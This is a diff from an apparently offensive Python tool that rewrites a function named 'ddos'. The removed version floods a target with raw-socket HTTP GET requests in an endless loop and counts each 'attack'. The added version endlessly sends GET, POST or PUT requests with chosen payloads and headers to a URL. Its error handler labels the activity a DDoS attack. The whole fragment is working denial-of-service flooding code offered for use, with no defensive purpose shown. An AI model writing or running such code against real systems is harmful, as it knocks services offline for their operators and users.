@@ -4,28 +4,35 @@ from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 import requests
 import os
+import json
 import re
 import requests
 
 attack_num = 0
 
 
-def ddos(target: str, port: int):
+def ddos(method, url, payload, headers):
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                target_ip = socket.gethostbyname(target)
-                s.connect((target_ip, port))
-                s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
-                s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))
-
-                global attack_num
-                attack_num += 1
-                rprint(f"[bold red]Attack Number: {attack_num}[/bold red]")
+            if method.upper() == 'GET':
+                response = requests.get(url, params=payload, headers=headers)
+                rprint(f"[bold green]Status Code: {response.status_code}[/bold green]")
+                rprint(f"[white]{response.text}[/white]")
+            elif method.upper() in ("POST", "PUT"):
+                # Convert payload to JSON if it's a dictionary
+                if isinstance(payload, dict):
+                    payload = json.dumps(payload)
+                response = requests.request(method.upper(), url, data=payload, headers=headers)
+                rprint(f"[bold green]Status Code: {response.status_code}[/bold green]")
+                rprint(f"[white]{response.text}[/white]")
+            else:
+                rprint(
+                    f"[red][bold]Unsupported HTTP method: {method.upper()}[/bold][/red]"
+                )
 
         except socket.gaierror as e:
             rprint(
-                f"[bold red]Failed to resolve hostname {target}:[/bold red] {e}")
+                f"[bold red]Failed to resolve hostname {url}:[/bold red] {e}")
             break
         except Exception as e:
             rprint(f"[bold red]Error in DDoS attack:[/bold red] {e}")
